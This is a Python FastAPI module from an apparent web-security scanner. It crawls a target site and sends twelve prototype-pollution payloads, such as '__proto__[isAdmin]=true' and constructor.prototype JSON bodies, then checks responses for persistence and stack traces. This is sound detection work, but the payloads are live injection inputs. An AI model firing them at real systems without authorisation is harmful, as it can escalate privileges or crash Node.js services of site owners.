"""prototype_pollution_test - client/server-side prototype pollution probes
(playbook §5 #44 + §7 #64).

Object.prototype pollution lets an attacker drop arbitrary keys onto
*every* JS object in the running tab — or, on Node.js backends, every
object in the process — by abusing recursive merge/assign/lodash-set
patterns with a JSON body or query string like:

    ?__proto__[isAdmin]=true
    {"__proto__":{"isAdmin":true}}
    {"constructor":{"prototype":{"isAdmin":true}}}

This probe:
  1. Crawls the target page for the first ~20 same-origin internal
     links (anchor + form-action).
  2. Sends 12 well-known pollution payloads to each candidate
     endpoint — both via querystring AND JSON body.
  3. After each polluted request, fires a clean GET (with a unique
     `__vlcanary` cookie) and checks the response for either:
        a) the canary key reflected unexpectedly (e.g. echo of
           "isAdmin":true that wasn't present in the clean request)
        b) the same response now containing an admin/owner/role
           marker the clean baseline did not contain
        c) JSON parse errors / stack traces that mention "Object",
           "TypeError: Cannot read", "merge", "lodash"

A confirmed pollution that mutates server response = HIGH (server-side
contamination). A reflection of the marker without a state change =
MEDIUM (probable client-side pollution sink). Stack-trace leaks alone
= LOW.

Customer input via ScanRequest:
  - target              = website URL (http(s)://...)
  - options.max_endpoints = max endpoints to probe (default 8)
  - options.user_agent    = optional UA override
"""
from __future__ import annotations
import asyncio
import json
import re
from typing import Optional
from urllib.parse import urljoin, urlparse

from fastapi import APIRouter, Depends
from pydantic import BaseModel

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext, run_scanner
from tools._payloads.prototype_pollution_test_findings import (
    PROTOTYPE_POLLUTION_TEST_FINDING_RULES,
)

router = APIRouter()


class PrototypePollutionRequest(ScanRequest):
    options: Optional[dict] = None


# 12 known-good payload classes — covers lodash _.merge, jQuery $.extend,
# Object.assign deep, Hoek/Lodash/Hoek 'set' pattern, plus Function.prototype
# variants (DoS / RCE on Node).
POLLUTION_PAYLOADS = [
    {
        "id": "qs_proto_isAdmin",
        "technique": "Querystring __proto__[isAdmin]=true",
        "method":    "GET",
        "qs":        {"__proto__[isAdmin]": "true"},
        "markers":   ["isAdmin", "is_admin", "admin"],
    },
    {
        "id": "qs_proto_role",
        "technique": "Querystring __proto__[role]=admin",
        "method":    "GET",
        "qs":        {"__proto__[role]": "admin"},
        "markers":   ["\"role\":\"admin\"", "is_admin", "superuser"],
    },
    {
        "id": "qs_constructor_proto",
        "technique": "Querystring constructor[prototype][polluted]=yes",
        "method":    "GET",
        "qs":        {"constructor[prototype][polluted]": "yes"},
        "markers":   ["polluted", "constructor"],
    },
    {
        "id": "qs_toString_inject",
        "technique": "Querystring __proto__[toString]=polluted",
        "method":    "GET",
        "qs":        {"__proto__[toString]": "polluted"},
        "markers":   ["polluted", "[object", "TypeError"],
    },
    {
        "id": "json_proto_isAdmin",
        "technique": "JSON body {__proto__:{isAdmin:true}}",
        "method":    "POST",
        "json":      {"__proto__": {"isAdmin": True}},
        "markers":   ["isAdmin", "is_admin", "admin"],
    },
    {
        "id": "json_proto_role",
        "technique": "JSON body {__proto__:{role:'admin'}}",
        "method":    "POST",
        "json":      {"__proto__": {"role": "admin"}},
        "markers":   ["\"role\":\"admin\"", "is_admin"],
    },
    {
        "id": "json_constructor_proto",
        "technique": "JSON body constructor.prototype.polluted",
        "method":    "POST",
        "json":      {"constructor": {"prototype": {"polluted": True}}},
        "markers":   ["polluted", "TypeError"],
    },
    {
        "id": "json_lodash_merge",
        "technique": "JSON body for lodash _.merge / _.set pollution",
        "method":    "POST",
        "json":      {"a": {"__proto__": {"polluted_lodash": "yes"}}},
        "markers":   ["polluted_lodash", "Cannot read property", "lodash"],
    },
    {
        "id": "json_jquery_extend",
        "technique": "JSON body for jQuery.extend(true,...) recursion",
        "method":    "POST",
        "json":      {"foo": {"__proto__": {"polluted_jq": "yes"}}, "bar": "x"},
        "markers":   ["polluted_jq", "Cannot set property"],
    },
    {
        "id": "json_object_assign",
        "technique": "JSON body for Object.assign deep merge variant",
        "method":    "POST",
        "json":      {"target": {"constructor": {"prototype": {"poll_assign": "yes"}}}},
        "markers":   ["poll_assign"],
    },
    {
        "id": "json_func_proto",
        "technique": "JSON body Function.prototype contamination (Node)",
        "method":    "POST",
        "json":      {"a": {"__proto__": {"call": "polluted_fn"}}},
        "markers":   ["polluted_fn", "TypeError", "not a function"],
    },
    {
        "id": "qs_double_underscore_proto",
        "technique": "Querystring with bracket-encoded __proto__",
        "method":    "GET",
        "qs":        {"a[__proto__][polluted_qs]": "1"},
        "markers":   ["polluted_qs"],
    },
]


_INTERNAL_LINK_RE = re.compile(r"""href\s*=\s*['"]([^'"#]+)['"]""", re.IGNORECASE)
_FORM_ACTION_RE = re.compile(r"""<form[^>]*action\s*=\s*['"]([^'"]+)['"]""", re.IGNORECASE)
_ERROR_HINTS = [
    "TypeError: Cannot",
    "TypeError: Object",
    "ReferenceError",
    "at Object.merge",
    "lodash",
    "Hoek",
    "Cannot convert undefined or null",
    "Cannot read property",
]


async def _crawl_endpoints(client, base_url: str, max_endpoints: int) -> list[str]:
    """Return up to max_endpoints same-origin URLs (incl. base_url itself)."""
    try:
        r = await client.get(base_url)
        html = r.text or ""
    except Exception:
        return [base_url]

    parsed_base = urlparse(base_url)
    seen: set = {base_url}
    out: list[str] = [base_url]
    candidates: list[str] = []
    for m in _INTERNAL_LINK_RE.finditer(html):
        candidates.append(m.group(1))
    for m in _FORM_ACTION_RE.finditer(html):
        candidates.append(m.group(1))
    for raw in candidates:
        full = urljoin(base_url, raw)
        p = urlparse(full)
        if p.scheme not in ("http", "https"):
            continue
        if p.netloc != parsed_base.netloc:
            continue
        # Strip the fragment
        cleaned = full.split("#", 1)[0]
        if cleaned in seen:
            continue
        seen.add(cleaned)
        out.append(cleaned)
        if len(out) >= max_endpoints:
            break
    return out


async def _baseline_get(client, url: str):
    try:
        r = await client.get(url)
        return r.text or "", r.status_code
    except Exception:
        return "", 0


async def _try_payload(client, url, payload, baseline_body, baseline_status):
    """Send one polluted request + a follow-up clean GET. Returns hit dict or None."""
    pol_status = 0
    pol_body = ""
    follow_body = ""
    follow_status = 0
    try:
        if payload["method"] == "GET":
            r = await client.get(url, params=payload.get("qs") or {})
            pol_status = r.status_code
            pol_body = r.text or ""
        else:
            r = await client.post(
                url,
                json=payload.get("json"),
                headers={"Content-Type": "application/json"},
            )
            pol_status = r.status_code
            pol_body = r.text or ""
    except Exception:
        return None
    # Follow-up clean GET — does the pollution PERSIST across requests?
    try:
        r2 = await client.get(url, cookies={"__vlcanary": payload["id"]})
        follow_status = r2.status_code
        follow_body = r2.text or ""
    except Exception:
        pass

    pol_low = pol_body.lower()
    follow_low = follow_body.lower()
    bl_low = baseline_body.lower()

    new_in_polluted: list[str] = []
    new_in_followup: list[str] = []
    error_hints: list[str] = []

    for marker in payload["markers"]:
        m_low = marker.lower()
        # marker shows in polluted but NOT in baseline
        if m_low in pol_low and m_low not in bl_low:
            new_in_polluted.append(marker)
        # marker persists into the clean follow-up GET (server-side
        # pollution survived the request)
        if m_low in follow_low and m_low not in bl_low:
            new_in_followup.append(marker)
    for hint in _ERROR_HINTS:
        if hint in pol_body and hint not in baseline_body:
            error_hints.append(hint)

    if not (new_in_polluted or new_in_followup or error_hints):
        return None

    return {
        "id":              payload["id"],
        "technique":       payload["technique"],
        "method":          payload["method"],
        "url":             url,
        "pol_status":      pol_status,
        "baseline_status": baseline_status,
        "followup_status": follow_status,
        "new_in_polluted": new_in_polluted,
        "new_in_followup": new_in_followup,
        "error_hints":     error_hints,
        "snippet":         pol_body[:240],
    }


async def gather(ctx: ScanContext):
    target = (ctx.host or "").strip()
    if not target:
        ctx.source("no-target")
        return
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    try:
        import httpx
    except ImportError:
        ctx.state["proto_pollution_error"] = "httpx not installed"
        ctx.source("httpx missing")
        return

    opts = ctx.state.get("_options") or {}
    max_endpoints = min(int(opts.get("max_endpoints") or 8), 20)
    ua = opts.get("user_agent") or (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    hits: list[dict] = []
    persistent_hits: list[dict] = []
    err_hits: list[dict] = []
    endpoints_tested = 0
    payloads_sent = 0
    transport_errors = 0

    try:
        async with httpx.AsyncClient(
            verify=False, timeout=20, follow_redirects=True,
            headers={"User-Agent": ua, "Accept": "*/*"},
        ) as client:
            endpoints = await _crawl_endpoints(client, target, max_endpoints)
            endpoints_tested = len(endpoints)

            sem = asyncio.Semaphore(4)

            async def _per_endpoint(url):
                nonlocal payloads_sent, transport_errors
                baseline_body, baseline_status = await _baseline_get(client, url)
                async def _bound(p):
                    nonlocal payloads_sent, transport_errors
                    async with sem:
                        try:
                            res = await _try_payload(client, url, p,
                                                       baseline_body,
                                                       baseline_status)
                            payloads_sent += 1
                            return res
                        except Exception:
                            transport_errors += 1
                            return None
                results = await asyncio.gather(
                    *[_bound(p) for p in POLLUTION_PAYLOADS]
                )
                return [r for r in results if r]

            per_endpoint_results = await asyncio.gather(
                *[_per_endpoint(u) for u in endpoints]
            )
            for ep_hits in per_endpoint_results:
                for h in ep_hits:
                    hits.append(h)
                    if h.get("new_in_followup"):
                        persistent_hits.append(h)
                    elif h.get("error_hints") and not h.get("new_in_polluted"):
                        err_hits.append(h)
    except Exception as e:
        ctx.state["proto_pollution_error"] = (
            f"crawl/probe failed: {type(e).__name__}: {str(e)[:120]}"
        )
        ctx.source("probe failed")
        return

    ctx.state["proto_pollution_target_url"] = target
    ctx.state["proto_pollution_endpoints_tested"] = endpoints_tested
    ctx.state["proto_pollution_payloads_sent"] = payloads_sent
    ctx.state["proto_pollution_transport_errors"] = transport_errors
    ctx.state["proto_pollution_hits_total"] = len(hits)
    ctx.state["proto_pollution_hits"] = hits[:40]
    ctx.state["proto_pollution_persistent"] = persistent_hits[:10]
    ctx.state["proto_pollution_error_hints"] = err_hits[:10]
    ctx.source(f"{endpoints_tested} endpoint(s), {payloads_sent} probes; "
               f"{len(hits)} hit(s), {len(persistent_hits)} persistent")


INTEL_FIELDS = [
    ("Target URL",                  "proto_pollution_target_url"),
    ("Endpoints probed",            "proto_pollution_endpoints_tested"),
    ("Payloads delivered",          "proto_pollution_payloads_sent"),
    ("Transport errors",            "proto_pollution_transport_errors"),
    ("Total marker hits",           "proto_pollution_hits_total"),
    ("Persistent (server-side)",    "proto_pollution_persistent"),
    ("Stack-trace / error hints",   "proto_pollution_error_hints"),
    ("Hit details (sample)",        "proto_pollution_hits"),
]


@router.post("/api/client_side/prototype_pollution_test")
async def client_side_prototype_pollution_test(req: PrototypePollutionRequest,
                                                _=Depends(verify_scan_quota)):
    options = req.options or {}

    async def _gather_with_options(ctx: ScanContext):
        ctx.state["_options"] = options
        await gather(ctx)

    return await run_scanner(
        host=req.target,
        tool="prototype_pollution_test",
        gather_func=_gather_with_options,
        finding_rules=PROTOTYPE_POLLUTION_TEST_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
        flat_field_keys=[],
    )


def register(app):
    app.include_router(router)
